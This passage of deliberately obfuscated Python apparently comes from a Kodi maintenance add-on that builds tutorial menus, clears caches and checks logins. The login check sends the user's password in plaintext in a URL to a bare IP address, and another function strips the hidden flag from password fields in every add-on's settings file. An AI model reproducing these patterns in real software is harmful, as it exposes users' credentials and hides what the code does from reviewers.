 O0o0oOooOoo = re . compile ( 'screenshot7="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOo0O0 = re . compile ( 'screenshot8="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIi1iI = re . compile ( 'screenshot9="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIII1iII1i = re . compile ( 'screenshot10="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0OO00OoO00 = re . compile ( 'screenshot11="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O00o = re . compile ( 'screenshot12="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii11Iiii1iiii = re . compile ( 'screenshot13="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i1IIII1111 = re . compile ( 'screenshot14="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Oooo = re . compile ( 'screenshot15="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 7 - 7: OoOoOO00 % OOo00O0 + OoOoOO00 - OoOoOO00 * i11iIiiIii % OoO0O00
 ooO = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 I11II1i1 = iiI1i [ 0 ] if ( len ( iiI1i ) > 0 ) else ''
 O00oO0 = IiIi1Ii [ 0 ] if ( len ( IiIi1Ii ) > 0 ) else 'None'
 O0Oo00OoOo = iiIIiI11II1 [ 0 ] if ( len ( iiIIiI11II1 ) > 0 ) else 'None'
 ii1ii111 = oooOo [ 0 ] if ( len ( oooOo ) > 0 ) else 'None'
 i11111I1I = oOoO0Oo0 [ 0 ] if ( len ( oOoO0Oo0 ) > 0 ) else 'None'
 ii1Oo0000oOo = i11i11i [ 0 ] if ( len ( i11i11i ) > 0 ) else 'None'
 Iii = iiI1iI [ 0 ] if ( len ( iiI1iI ) > 0 ) else 'None'
 I1iiiiI1iI = Ooo00O0 [ 0 ] if ( len ( Ooo00O0 ) > 0 ) else 'None'
 iIiiiii1i = OoO0OOoO0 [ 0 ] if ( len ( OoO0OOoO0 ) > 0 ) else 'None'
 iiIi1IIiI = iiI11i [ 0 ] if ( len ( iiI11i ) > 0 ) else 'None'
 i1oO0OO0 = o0Oo [ 0 ] if ( len ( o0Oo ) > 0 ) else 'None'
 I1IiiIi11 = oOO0 [ 0 ] if ( len ( oOO0 ) > 0 ) else ''
 oOOOOOo0OO0o0oOO0 = '[CR][CR][COLOR=dodgerblue]Step 1:[/COLOR][CR]' + i1i1iIi1IiI [ 0 ] if ( len ( i1i1iIi1IiI ) > 0 ) else ''
 i1II1IiIIi = '[CR][CR][COLOR=dodgerblue]Step 2:[/COLOR][CR]' + i11i11Iii [ 0 ] if ( len ( i11i11Iii ) > 0 ) else ''
 o0O0 = '[CR][CR][COLOR=dodgerblue]Step 3:[/COLOR][CR]' + OO0o00Oo0oo0 [ 0 ] if ( len ( OO0o00Oo0oo0 ) > 0 ) else ''
 iiIi1I1IIIII1IIi = '[CR][CR][COLOR=dodgerblue]Step 4:[/COLOR][CR]' + I11Oo0O00O0O00 [ 0 ] if ( len ( I11Oo0O00O0O00 ) > 0 ) else ''
 i11iii1II1I1 = '[CR][CR][COLOR=dodgerblue]Step 5:[/COLOR][CR]' + II1I1i [ 0 ] if ( len ( II1I1i ) > 0 ) else ''
 IiIi11iI1IIi = '[CR][CR][COLOR=dodgerblue]Step 6:[/COLOR][CR]' + O00OoOo0OooOo [ 0 ] if ( len ( O00OoOo0OooOo ) > 0 ) else ''
 iII111I = '[CR][CR][COLOR=dodgerblue]Step 7:[/COLOR][CR]' + OOooOoOOo0O [ 0 ] if ( len ( OOooOoOOo0O ) > 0 ) else ''
 Ooooo0Oo0oOo = '[CR][CR][COLOR=dodgerblue]Step 8:[/COLOR][CR]' + IIi11ii [ 0 ] if ( len ( IIi11ii ) > 0 ) else ''
 IiI1III1 = '[CR][CR][COLOR=dodgerblue]Step 9:[/COLOR][CR]' + OOOO0oO0OOo0o [ 0 ] if ( len ( OOOO0oO0OOo0o ) > 0 ) else ''
 iiiiII1i1Iii1I1 = '[CR][CR][COLOR=dodgerblue]Step 10:[/COLOR][CR]' + OoOO [ 0 ] if ( len ( OoOO ) > 0 ) else ''
 OoOO00OO0 = '[CR][CR][COLOR=dodgerblue]Step 11:[/COLOR][CR]' + iiiiI [ 0 ] if ( len ( iiiiI ) > 0 ) else ''
 OoOoooOooOO0o = '[CR][CR][COLOR=dodgerblue]Step 12:[/COLOR][CR]' + ooo0O0O0OO [ 0 ] if ( len ( ooo0O0O0OO ) > 0 ) else ''
 I1iooOOooO = '[CR][CR][COLOR=dodgerblue]Step 13:[/COLOR][CR]' + oOooOOoO [ 0 ] if ( len ( oOooOOoO ) > 0 ) else ''
 O0O00o00O0 = '[CR][CR][COLOR=dodgerblue]Step 14:[/COLOR][CR]' + o0o000OOO [ 0 ] if ( len ( o0o000OOO ) > 0 ) else ''
 O00o0I1ii1i1 = '[CR][CR][COLOR=dodgerblue]Step 15:[/COLOR][CR]' + I1111iii1ii11 [ 0 ] if ( len ( I1111iii1ii11 ) > 0 ) else ''
 oOoooO00OO0o = OoOooOo00o [ 0 ] if ( len ( OoOooOo00o ) > 0 ) else ''
 iIi1iIi11ii = iI1IIi [ 0 ] if ( len ( iI1IIi ) > 0 ) else ''
 IiI111I = II11oo0o0O [ 0 ] if ( len ( II11oo0o0O ) > 0 ) else ''
 oo0oO0 = ooo0ooooo0o [ 0 ] if ( len ( ooo0ooooo0o ) > 0 ) else ''
 ii1i1Iii = IIIII [ 0 ] if ( len ( IIIII ) > 0 ) else ''
 IIII11111Ii = Ii1IIi1I11i [ 0 ] if ( len ( Ii1IIi1I11i ) > 0 ) else ''
 IiiiII = O0o0oOooOoo [ 0 ] if ( len ( O0o0oOooOoo ) > 0 ) else ''
 OoOoo00Oo0OoO = oOo0O0 [ 0 ] if ( len ( oOo0O0 ) > 0 ) else ''
 o0o0 = iIi1iI [ 0 ] if ( len ( iIi1iI ) > 0 ) else ''
 oOOOOOooo = iIIII1iII1i [ 0 ] if ( len ( iIIII1iII1i ) > 0 ) else ''
 IIII = O0OO00OoO00 [ 0 ] if ( len ( O0OO00OoO00 ) > 0 ) else ''
 o0o0OOo0OOoO = O00o [ 0 ] if ( len ( O00o ) > 0 ) else ''
 O0ooO = Ii11Iiii1iiii [ 0 ] if ( len ( Ii11Iiii1iiii ) > 0 ) else ''
 i1Ii1IiiIi1II = i1IIII1111 [ 0 ] if ( len ( i1IIII1111 ) > 0 ) else ''
 i11i1IiIi11 = Oooo [ 0 ] if ( len ( Oooo ) > 0 ) else ''
 i1i1IIii1i1 = str ( '[COLOR=orange]Author: [/COLOR]' + I11II1i1 + '[CR][CR][COLOR=lime]About: [/COLOR]' + I1IiiIi11 + oOOOOOo0OO0o0oOO0 + i1II1IiIIi + o0O0 + iiIi1I1IIIII1IIi + i11iii1II1I1 + IiIi11iI1IIi + iII111I + Ooooo0Oo0oOo + IiI1III1 + iiiiII1i1Iii1I1 + OoOO00OO0 + OoOoooOooOO0o + I1iooOOooO + O0O00o00O0 + O00o0I1ii1i1 )
 if 76 - 76: iIii1I11I1II1 / ooOo * iIii1I11I1II1 / OoO0O00 . OOo00O0
 if oOOOOOo0OO0o0oOO0 != '' :
  iIiIIi1 ( '' , '[COLOR=yellow][Text Guide][/COLOR]  ' + ooO , i1i1IIii1i1 , 'text_guide' , 'How_To.png' , Oo00OOOOO , I1IiiIi11 , '' )
 if O00oO0 != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + Iii , O00oO0 , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if O0Oo00OoOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + I1iiiiI1iI , O0Oo00OoOo , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if ii1ii111 != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iIiiiii1i , ii1ii111 , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if i11111I1I != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iiIi1IIiI , i11111I1I , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if ii1Oo0000oOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + i1oO0OO0 , ii1Oo0000oOo , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
  if 22 - 22: i1IIi / OoOoOO00 / Oo . OoO0O00 % iI1iiIiiII + i11iIiiIii
  if 86 - 86: OoOoOO00
def O0ooOIiI1 ( ) :
 if o0O . getSetting ( 'tutorial_manual_search' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'tutorials' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_all' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=lime]All Guides[/COLOR] Everything in one place' , '' , 'grab_tutorials' , 'All.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_kodi' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=lime]XBMC / Kodi[/COLOR] Specific' , '' , 'xbmc_menu' , 'XBMC.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_xbmc4xbox' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=lime]XBMC4Xbox[/COLOR] Specific' , '&platform=XBMC4Xbox' , 'xbmc_menu' , 'XBMC4Xbox.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_android' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Android' , '&platform=Android' , 'platform_menu' , 'Android.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_atv' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Apple TV' , '&platform=ATV' , 'platform_menu' , 'ATV.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_ios' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] ATV2 & iOS' , '&platform=iOS' , 'platform_menu' , 'iOS.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_linux' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Linux' , '&platform=Linux' , 'platform_menu' , 'Linux.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_pure_linux' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Pure Linux' , '&platform=Custom_Linux' , 'platform_menu' , 'Custom_Linux.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_openelec' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] OpenELEC' , '&platform=OpenELEC' , 'platform_menu' , 'OpenELEC.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_osmc' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSMC' , '&platform=OSMC' , 'platform_menu' , 'OSMC.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_osx' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSX' , '&platform=OSX' , 'platform_menu' , 'OSX.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_raspbmc' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Raspbmc' , '&platform=Raspbmc' , 'platform_menu' , 'Raspbmc.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_windows' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=orange][Platform][/COLOR] Windows' , '&platform=Windows' , 'platform_menu' , 'Windows.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_allwinner' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Allwinner Devices' , '&hardware=Allwinner' , 'platform_menu' , 'Allwinner.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_aftv' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Amazon Fire TV' , '&hardware=AFTV' , 'platform_menu' , 'AFTV.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_amlogic' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] AMLogic Devices' , '&hardware=AMLogic' , 'platform_menu' , 'AMLogic.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_boxee' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Boxee' , '&hardware=Boxee' , 'platform_menu' , 'Boxee.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_intel' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Intel Devices' , '&hardware=Intel' , 'platform_menu' , 'Intel.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_rpi' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Raspberry Pi' , '&hardware=RaspberryPi' , 'platform_menu' , 'RaspberryPi.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_rockchip' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Rockchip Devices' , '&hardware=Rockchip' , 'platform_menu' , 'Rockchip.png' , '' , '' , '' )
 if o0O . getSetting ( 'tutorial_xbox' ) == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Xbox' , '&hardware=Xbox' , 'platform_menu' , 'Xbox_Original.png' , '' , '' , '' )
  if 82 - 82: II111iiii . iI1iiIiiII
  if 80 - 80: o0oOOo0O0Ooo
def I111iIii1i1 ( ) :
 O0OoO000O0OO = xbmcgui . Dialog ( )
 if O0OoO000O0OO . yesno ( "Make Add-on Passwords Visible?" , "This will make all your add-on passwords visible in the add-on settings. Are you sure you wish to continue?" ) :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( Ooo ) :
   for ooOo0O0o0 in ooO0oo :
    if ooOo0O0o0 == 'settings.xml' :
     i1i1i1I = open ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) ) . read ( )
     i11111I1IOoo0ooOOOOoOo = re . compile ( '<setting id=(.+?)>' ) . findall ( i1i1i1I )
     for i111II in i11111I1IOoo0ooOOOOoOo :
      if 'pass' in i111II :
       if 'option="hidden"' in i111II :
        try :
         O0o0 = i111II . replace ( ' option="hidden"' , '' )
         ooOo0O0o0 = open ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) , mode = 'w' )
         ooOo0O0o0 . write ( str ( i1i1i1I ) . replace ( i111II , O0o0 ) )
         ooOo0O0o0 . close ( )
        except :
         pass
  O0OoO000O0OO . ok ( "Passwords Are now visible" , "Your passwords will now be visible in your add-on settings. If you want to undo this please use the option to hide passwords." )
  if 6 - 6: iI1iiIiiII % oOoO0o00OO0 / OO0oo0oOO + iI1iiIiiII . ooOo
  if 70 - 70: iIii1I11I1II1 / OO0oo0oOO
def OoOOO0o0OO0oo ( ) :
 if o0O . getSetting ( 'email' ) == '' :
  O0OoO000O0OO = xbmcgui . Dialog ( )
  O0OoO000O0OO . ok ( "No Email Address Set" , "A new window will Now open for you to enter your Email address. The logfile will be sent here" )
  o0O . openSettings ( )
 xbmc . executebuiltin ( 'XBMC.RunScript(special://home/addons/' + I1IiI + '/uploadLog.py)' )
 if 60 - 60: Oo - OO0oo0oOO + II111iiii / iii1I11ii1i1 - iI1iiIiiII
 if 49 - 49: OO0oo0oOO + OoooooooOO . O0 . i11iIiiIii
def O0O0o00o00O00 ( localbuildcheck , localversioncheck , localidcheck ) :
 if o0oOoO00o == 'true' :
  iIII1I111III = 'http://120.24.252.100/TI/login/login_details.php?user=%s&pass=%s' % ( oo00 , o00 )
 else : iIII1I111III = 'http://120.24.252.100/TI/login/login_details.php?user=%s&pass=%s' % ( '' , '' )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OOOoOO = re . compile ( 'login_msg="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OooOoOoo0ooo0 = OOOoOO [ 0 ] if ( len ( OOOoOO ) > 0 ) else ''
 if 69 - 69: Oo0Ooo * OOo00O0
 if 91 - 91: o0oOOo0O0Ooo . OOo00O0 / OoO0O00 / i11iIiiIii * o0oOOo0O0Ooo
 if not 'REGISTER FOR FREE' in OooOoOoo0ooo0 :
  O00ooOo = open ( o0OO00oO , mode = 'w+' )
  O00ooOo . write ( 'd="' + O00OIiIIiIiIIiI ( ) + '"\nlogin_msg="' + OooOoOoo0ooo0 + '"' )
  O00ooOo . close ( )
  if 52 - 52: I1IiiI - i11iIiiIii / oOoO0o00OO0 . ooOo
 ooo0oo ( localbuildcheck , localversioncheck , localidcheck , OooOoOoo0ooo0 )
 if 38 - 38: ooOo + OoooooooOO * OoOoOO00 % ooOo
 if 91 - 91: i1IIi - I1ii11iIi11i * I1IiiI
def oOOo0 ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 xbmcgui . Dialog ( ) . ok ( 'Force Refresh Started Successfully' , 'Depending on the speed of your device it could take a few minutes for the update to take effect.' )
 return
 if 24 - 24: OoOoOO00 * OO0oo0oOO
 if 17 - 17: OoO0O00 . I1IiiI * O0
def oO0ooo000 ( ) :
 i11II = 1
 try :
  iIIIiIi ( 'http://google.com' )
 except :
  try :
   iIIIiIi ( 'http://google.com' )
  except :
   try :
    iIIIiIi ( 'http://google.com' )
   except :
    try :
     iIIIiIi ( 'http://google.cn' )
    except :
     try :
      iIIIiIi ( 'http://google.cn' )
     except :
      O0OoO000O0OO . ok ( "NO INTERNET CONNECTION" , 'It looks like this device isn\'t connected to the internet. Only some of the maintenance options will work until you fix the connectivity problem.' )
      ooo0oo ( '' , '' , '' , '[COLOR=orange]NO INTERNET CONNECTION[/COLOR]' )
      i11II = 0
 if i11II == 1 :
  II1OoOOoOOOoooO0 ( )
  if 5 - 5: oOoO0o00OO0 - iii1I11ii1i1
  if 16 - 16: oOoO0o00OO0 . oo0oooooO0 . Oo0Ooo % Oo / oOoO0o00OO0
def II1OoOOoOOOoooO0 ( ) :
 ooo0OoO = 'None'
 ooO0 = '0'
 if 72 - 72: o0oOOo0O0Ooo * OOo00O0 - i11iIiiIii / OO0oo0oOO
 if 11 - 11: O0 - I1IiiI
 Oo0oO00 = open ( Iii111II , mode = 'r' )
 O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
 Oo0oO00 . close ( )
 if 31 - 31: oo0oooooO0
 I11IoO00Oo000oO = re . compile ( 'date="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
 iI1I = I11IoO00Oo000oO [ 0 ] if ( len ( I11IoO00Oo000oO ) > 0 ) else ''
 OOoOoO = re . compile ( 'version="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
 IIIi1I1IIii1II = OOoOoO [ 0 ] if ( len ( OOoOoO ) > 0 ) else ''
 if 15 - 15: OoooooooOO
 OooO0O0Ooo = open ( Ooo0OO0oOO , mode = 'r' )
 oO0O = OooO0O0Ooo . read ( )
 OooO0O0Ooo . close ( )
 if 31 - 31: II111iiii
 i1IIII1iii11I = re . compile ( 'id="(.+?)"' ) . findall ( oO0O )
 II111i1ii1iII = re . compile ( 'name="(.+?)"' ) . findall ( oO0O )
 ooO0 = i1IIII1iii11I [ 0 ] if ( len ( i1IIII1iii11I ) > 0 ) else 'None'
 ooo0OoO = II111i1ii1iII [ 0 ] if ( len ( II111i1ii1iII ) > 0 ) else ''
 if 62 - 62: iIii1I11I1II1 % iI1iiIiiII % I1ii11iIi11i * oOoO0o00OO0
 if 87 - 87: oOoO0o00OO0
 if oOo0oooo00o == 'true' :
  try :
   IIo0o0O0O00oOOo = iIIIiIi ( oO0o0o0ooO0oO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   II1i1i = re . compile ( 'date="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
   IIio0 = re . compile ( 'video="https://www.youtube.com/watch\?v=(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
   IiIii111III1 = II1i1i [ 0 ] if ( len ( II1i1i ) > 0 ) else ''
   i1OO0o = IIio0 [ 0 ] if ( len ( IIio0 ) > 0 ) else ''
   if 64 - 64: i1IIi / o0oOOo0O0Ooo
   if 24 - 24: I1ii11iIi11i * OoO0O00 . OoooooooOO % OO0oo0oOO % O0
   if int ( iI1I ) < int ( IiIii111III1 ) :
    i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( iI1I , IiIii111III1 )
    O00ooOo = open ( Iii111II , mode = 'w' )
    O00ooOo . write ( str ( i1iiiIii11 ) )
    O00ooOo . close ( )
    if 46 - 46: oo0oooooO0 + iI1iiIiiII % OoooooooOO * I1ii11iIi11i
   yt . PlayVideo ( i1OO0o , forcePlayer = True )
   xbmc . sleep ( 500 )
   while xbmc . Player ( ) . isPlaying ( ) :
    xbmc . sleep ( 500 )
  except : pass
 if not os . path . exists ( o0OO00oO ) :
  print "### First login check ###"
  O0O0o00o00O00 ( ooo0OoO , IIIi1I1IIii1II , ooO0 )
  if 89 - 89: oOoO0o00OO0 - oOoO0o00OO0 % oo0oooooO0 / iii1I11ii1i1 + ooOo - oOoO0o00OO0
  if 97 - 97: OO0oo0oOO % OoOoOO00 / I1ii11iIi11i / iIii1I11I1II1 * OoooooooOO * Oo
 else :
  oOoO = open ( o0OO00oO , mode = 'r' )
  Oo00oO = oOoO . read ( )
  oOoO . close ( )
  if 71 - 71: i11iIiiIii * OoOoOO00 * Oo + ooOo + Oo0Ooo
  oOoOo0OOOOOO = re . compile ( 'd="(.+?)"' ) . findall ( Oo00oO )
  I1IIiIi = re . compile ( 'login_msg="(.+?)"' ) . findall ( Oo00oO )
  O000O = oOoOo0OOOOOO [ 0 ] if ( len ( oOoOo0OOOOOO ) > 0 ) else '0'
  OooOoOoo0ooo0 = I1IIiIi [ 0 ] if ( len ( I1IIiIi ) > 0 ) else ''
  if 68 - 68: OoooooooOO % Oo0Ooo + Oo0Ooo * OoooooooOO + I1ii11iIi11i * O0
  if int ( O000O ) + 2000000 > int ( O00OIiIIiIiIIiI ( ) ) :
   print "### Login successful ###"
   ooo0oo ( ooo0OoO , IIIi1I1IIii1II , ooO0 , OooOoOoo0ooo0 )
  else :
   print "### Checking login ###"
   O0O0o00o00O00 ( ooo0OoO , IIIi1I1IIii1II , ooO0 )
   if 33 - 33: I1ii11iIi11i - oOoO0o00OO0
   if 17 - 17: Oo - ooOo
def OooO0OOo ( ) :
 ii1ii = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( ii1ii ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( ii1ii ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     try :
      os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
     except :
      pass
    for ii1iIIiii1 in iIIIIiiIii :
     try :
      shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     except :
      pass
 II1iII = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'temp' )
 if os . path . exists ( II1iII ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( II1iII ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     try :
      os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
     except :
      pass
    for ii1iIIiii1 in iIIIIiiIii :
     try :
      shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     except :
      pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  IIi1iIII = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( IIi1iIII ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
  i111iIiI = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( i111iIiI ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 95 - 95: I1ii11iIi11i + iIii1I11I1II1 % Oo0Ooo
 Oo0oO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( Oo0oO ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( Oo0oO ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 81 - 81: OoooooooOO / OOo00O0 * iIii1I11I1II1 . Oo0Ooo + ooOo / O0
 ooO0o0Oo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.image.music.slideshow/cache' ) , '' )
 if os . path . exists ( ooO0o0Oo ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( ooO0o0Oo ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 67 - 67: OoOoOO00
 OOO0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( OOO0 ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( OOO0 ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 75 - 75: I1IiiI
 o00o000 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( o00o000 ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( o00o000 ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 41 - 41: I1ii11iIi11i * i11iIiiIii - Oo0Ooo * II111iiii
 OOO0oOO0ooOO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.navi-x/cache' ) , '' )
 if os . path . exists ( OOO0oOO0ooOO ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( OOO0oOO0ooOO ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 65 - 65: iIii1I11I1II1
 ooo0o0oOoOO0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( ooo0o0oOoOO0 ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( ooo0o0oOoOO0 ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 56 - 56: Oo0Ooo % i11iIiiIii / OO0oo0oOO . iI1iiIiiII . OoO0O00 - OoOoOO00
